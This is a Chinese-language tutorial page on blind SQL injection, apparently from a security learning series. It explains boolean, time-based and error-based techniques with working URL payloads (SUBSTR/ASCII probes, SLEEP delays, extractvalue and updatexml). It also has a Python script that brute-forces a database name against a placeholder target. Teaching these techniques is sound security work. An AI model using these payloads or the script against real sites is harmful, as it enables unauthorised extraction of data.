# SQL 盲注

## 什么是盲注？

当页面不显示查询结果，也不返回详细的报错信息时，攻击者需要通过其他方式判断注入是否成功。这就是盲注（Blind SQL Injection）。

## 布尔盲注

通过观察页面的不同响应（如内容变化、状态码）来逐字符推断数据。

### 判断数据库名长度

```
?id=1 AND LENGTH(database())=10
```

如果页面正常返回，说明数据库名长度是 10。

### 逐字符猜解数据库名

```
?id=1 AND SUBSTR(database(),1,1)='c'
?id=1 AND ASCII(SUBSTR(database(),1,1))=99
```

### 自动化脚本

```python
import requests

result = ""
for i in range(1, 20):
    for c in range(32, 127):
        url = f"http://target/?id=1 AND ASCII(SUBSTR(database(),{i},1))={c}"
        r = requests.get(url)
        if "产品" in r.text:
            result += chr(c)
            print(result)
            break
```

## 延时盲注

当页面没有任何变化时，可以通过时间延迟来判断。

### 基本用法

```
?id=1 AND IF(1=1, SLEEP(3), 0)
```

如果页面延迟 3 秒返回，说明条件为真。

### 逐字符猜解

```
?id=1 AND IF(ASCII(SUBSTR(database(),1,1))=99, SLEEP(3), 0)
```

## 报错注入

利用数据库的报错信息来提取数据。

### extractvalue

```
?id=1 AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))
```

### updatexml

```
?id=1 AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)
```

## 关键知识点

- **布尔盲注** — 通过页面差异判断
- **延时盲注** — 通过时间延迟判断
- **报错注入** — 利用报错信息提取数据
- **SUBSTR/ASCII** — 字符串截取和转换函数

## 下一步

回到 [SQL 注入分类](../categories) 继续学习其他类型。
